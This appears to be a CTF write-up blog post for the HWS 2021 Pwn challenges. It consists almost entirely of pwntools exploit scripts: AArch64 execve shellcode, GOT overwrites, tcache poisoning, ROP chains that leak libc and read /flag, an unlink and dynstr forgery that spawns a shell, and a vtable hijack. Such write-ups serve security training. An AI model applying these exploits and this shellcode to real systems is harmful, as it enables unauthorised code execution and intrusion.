---
title: HWS 2021 入营选拔赛 Pwn
date: 2021-02-02 00:00:00
categories:
- CTF/Pwn
tags:
---

> 更新中...

所有题目附件：[HWS20210128.zip](https://xuanxuanblingbling.github.io/assets/attachment/HWS20210128.zip)

## emarm

```python
from pwn import *
context(log_level='debug')

sc1 = "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2"
sc2 = "\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
sc3 = "\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa"
sc4 = "\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
sc5 = "\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"

fread_got = 0x412060
main_read = 0x400BE4

def aaw(addr,data):
    io.recv()
    io.send(str(addr))
    io.sendafter("success",data)
    io.sendlineafter("bye",'2')

while 1:
    try:
        io = process(["qemu-aarch64", "-L", ".", "./emarm"])
        #io = remote("183.129.189.60",10012)
        io.sendlineafter(":","a")
        aaw(fread_got,p64(main_read))
        aaw(0x412080,sc1)
        aaw(0x412088,sc2)
        aaw(0x412090,sc3)
        aaw(0x412098,sc4)
        aaw(0x4120a0,sc5)
        aaw(fread_got,p64(0x412080))
        io.interactive()
    except EOFError:
        io.close()
        continue
```

```python
from pwn import *
context(log_level='debug')

libc_addr  = 0x4000830000
fread_got  = 0x412060
one_gadget = 0x63e80

while 1:
    try:
        io = remote("183.129.189.60",10012)
        io.sendlineafter(":","a")
        io.recv()
        io.send(str(fread_got))
        io.sendlineafter("success",p64(libc_addr + one_gadget))
        io.sendlineafter("bye",'0')
        io.interactive()
    except EOFError:
        io.close()
        continue
```


## ememarm

```python
from pwn import *
context(log_level='debug')
io = process(['qemu-aarch64','-L','./','./ememarm'])
#io = process(['qemu-aarch64','-g','1234','-L','./','./ememarm'])
#io = remote("183.129.189.60",10034)
sla     = lambda delim,data         :  io.sendlineafter(delim,data)
sa      = lambda delim,data         :  io.sendafter(delim,data)
init    = lambda name               :  (sla("4268144",name))
add     = lambda data1,data2,yes    :  (sla(":","1"),sa("cx:",data1),sa("cy:",data2),sla("?",str(yes)))
add2    = lambda data1,data2,yes    :  (sla(":","4"),sa("cx:",data1),sa("cy:",data2),sla("?",str(yes)))
edit    = lambda idx  ,data         :  (sla(":","3\n"+str(idx)+"\n"+data))

# shelcode from https://www.exploit-db.com/shellcodes/47048

sc1 = "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2"
sc2 = "\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
sc3 = "\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa"
sc4 = "\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
sc5 = "\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"

init('xuan')


# first tcache dump:                # write shellcode(0x40 bytes) to 0x412058

add('a','a',1)
add('a','a',1)
add('a',p64(0x31),1)                # prepare a fake 0x31 chunk in 0x413300(myself local heap addr)
add('a','a',1)
add('a','a',1)
edit(4,'a'*24)                      # free a fake 0x31 chunk in 0x413300(myself local heap addr)
edit(3,p64(0)+p64(0x31)+'a'*8)      # fix the fake chunk size to 0x31 for malloc right and free it again
add(p64(0x412058),p64(0),1)         # make fake chunk fd  : 0x412058(.data) in tcache
add(p64(0),p64(0x412068),0)         # link fake chunk 4   : 0x412068(.data) to list
add(sc1,sc2,0)                      # write shellcode part 1 - 2 (16 bytes) to 0x412058
edit(4,sc3+sc4+sc5)                 # write shellcode part 3 - 5 (24 bytes) to 0x412068


# sencond tcache dump:              # write shellcode_addr(0x412058) to 0x412008(malloc@got)

add2('a','a',1)
add2('a','a',1)
add2('a','a',1)                     # don't need prepare a fake chunk in 0x413400(myself local heap addr)
add2('a','a',1)                     # because this addr real have a 0x41 chunk
add2('a','a',1)
edit(8,'a'*24)                      # free a fake 0x41 chunk in 0x413400(myself local heap addr)
edit(7,'a'*24)                      # free it again
add2(p64(0x412008),p64(0),1)        # make fake chunk fd : 0x412008(malloc@got) in tcache
add2(p64(0),p64(0),0)
add2(p64(0x412058),'a'*8,0)         # write shellcode_addr(0x412058) to 0x412008(malloc@got)


# malloc to trigger shellcode

sla(":","1")                            
io.interactive()
```

## justcode

```python
from pwn import *
context(arch='amd64',os='linux',log_level='debug')

myelf = ELF("./justcode")
libc = ELF("./libc-2.23.so")
io = process(myelf.path,env={"LD_PRELOAD":libc.path})
#io = remote("183.129.189.60",10041)
uu64    = lambda data   :u64(data.ljust(8, b'\0'))
sla     = lambda delim,data         :  io.sendlineafter(delim,data)
sa      = lambda delim,data         :  io.sendafter(delim,data)

stack_chk_fail_got  = 0x602038
pop_rdi_ret         = 0x400ea3
puts_plt            = 0x400940
puts_got            = 0x602028
overflow            = 0x400C47

#gdb.attach(io,"b * 0x400ea3")

rop = flat([pop_rdi_ret,puts_got,puts_plt,overflow])
io.sendlineafter("code","1\n2\n1\n1")
io.sendlineafter("name",'a'*12+p32(stack_chk_fail_got))
io.sendlineafter("id"  ,str(pop_rdi_ret))
io.sendlineafter("info","a")
io.sendlineafter("name",rop.ljust(137,'a'))

io.recvline()
io.recvline()
libc.address = uu64(io.recv(6))-0x6f6a0
log.success(hex(libc.address))

pop_rdx_ret = libc.address + 0x1b92
pop_rsi_ret = libc.address + 0x202f8

rop = flat([
    pop_rdi_ret,0,       pop_rsi_ret,0x602168,pop_rdx_ret,8,libc.symbols['read'],
    pop_rdi_ret,0x602168,pop_rsi_ret,0,                     libc.symbols['open'],
    overflow
    ])

io.sendlineafter("name",rop.ljust(137,'a'))
sleep(0.1)
io.sendline("/flag\x00")

rop = flat([
    pop_rdi_ret,3,       pop_rsi_ret,0x602178,pop_rdx_ret,100,libc.symbols['read'],
    pop_rdi_ret,1,       pop_rsi_ret,0x602178,pop_rdx_ret,100,libc.symbols['write'],
    overflow
    ])
io.sendlineafter("name",rop.ljust(137,'a'))
io.interactive()
```

## undlcv

```python
from pwn import *
context(log_level='debug',arch= 'amd64')
myelf = ELF("./undlcv")

#io = remote("183.129.189.60",10013)
io = process(myelf.path)
str_table      = myelf.get_section_by_name('.dynstr').data()
fake_str_table = str_table.replace("free","system")

#gdb.attach(io)
#sleep(1)
sl      = lambda data          :  (io.sendline(data),sleep(0.01))
add     = lambda index         :  (sl("1"),sl(str(index)))
edit    = lambda index,data    :  (sl("2"),sl(str(index)),sl(data))
free    = lambda index         :  (sl("3"),sl(str(index)))
padding = lambda               :  (sl("4"))

ptr = 0x403480
fd  = ptr - 0x18 
bk  = ptr - 0x10

free_got = 0x403418
str_tab  = 0x4032A0

add(0);add(1);padding()
fake_chunk = flat([0,0xf1,fd,bk])
edit(0,fake_chunk.ljust(240,'a')+p64(0xf0))

# trigger unlink
free(1)

edit(0,p64(0)*3+p64(str_tab)+p64(free_got)+fake_str_table)

# write str_tab (0x5,real str_table addr) ->  ("/bin/sh",fake str_table addr)
edit(0,'/bin/sh\x00'+p64(0x403490))

# write free_got -> 0x401030
edit(1,p64(0x401030))

# trigger dl runtime reslove
free(0)
io.interactive()

```

## vtcpp

```python
from pwn import *
context(arch='amd64',os='linux',log_level='debug')

myelf = ELF("./vtcpp")
libc = ELF("./libc-2.23.so")
io = process(myelf.path,env={"LD_PRELOAD":libc.path})
#io = remote("183.129.189.60",10000)
uu64    = lambda data               :  u64(data.ljust(8, b'\0'))
sla     = lambda delim,data         :  io.sendlineafter(delim,data)
sa      = lambda delim,data         :  io.sendafter(delim,data)

create  = lambda name,age,msg       :  (sla(">","1"), sla("name",name), sla("age",age), sla("message",msg) )
delete  = lambda                    :  (sla(">","2"))
show    = lambda                    :  (sla(">","3"))
malloc  = lambda size,data          :  (sla(">","4"), sla("size",str(size)), sla("content",data))
#gdb.attach(io,"b * 0x401a2d")
#gdb.attach(io,"b * 0x40166F")
bss_addr     = 0x603360
add_rsp_0x28 = 0x401a2d
pop_rsp      = 0x401c9d

pop_rdi_ret     = 0x401ca3
scanf_got       = 0x602F88 
puts_plt        = 0x401310
read_plt        = 0x401350
main            = 0x40166F
pop_rsi_r15_ret = 0x401ca1

rop = flat([
    0x1,0x2,0x3,
    pop_rdi_ret, scanf_got, puts_plt,
    pop_rdi_ret, 0, pop_rsi_r15_ret, 0x6033c8,0,read_plt
])

create(p64(pop_rsp)+'\x68\x33\x60\x00\x00\x00\x00',"18",p64(add_rsp_0x28)+rop)
delete()
malloc(0x38,p64(bss_addr))
show()
io.recv()
libc.address = uu64(io.recv(6))-0x6a7f0
log.success(hex(libc.address))

pop_rdx_ret = libc.address + 0x1b92
pop_rsi_ret = libc.address + 0x202f8

rop2 = flat([
    pop_rdi_ret,0,  pop_rsi_ret,0x603360,pop_rdx_ret,8,libc.symbols['read'],
    pop_rdi_ret,0,  pop_rsi_ret,0x603360,pop_rdx_ret,0,libc.symbols['openat'],
    pop_rdi_ret,3,  pop_rsi_ret,0x603360,pop_rdx_ret,100,libc.symbols['read'],
    pop_rdi_ret,1,  pop_rsi_ret,0x603360,pop_rdx_ret,100,libc.symbols['write'],
    ])
sleep(0.1)
io.send(rop2)
sleep(0.1)
io.sendline("/flag\x00")
io.interactive()
```
